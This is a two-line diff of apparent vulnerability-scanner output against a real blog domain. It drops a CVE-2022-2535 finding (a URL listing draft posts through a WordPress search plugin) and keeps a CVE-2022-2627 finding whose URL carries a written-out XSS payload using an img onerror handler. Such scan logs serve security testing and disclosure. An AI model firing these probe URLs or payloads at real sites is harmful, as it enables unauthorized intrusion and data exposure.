@@ -1,2 +1,1 @@
-[CVE-2022-2535] [http] [medium] https://blog.bitmex.com/wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft
 [CVE-2022-2627] [http] [medium] https://blog.bitmex.com/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="<form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
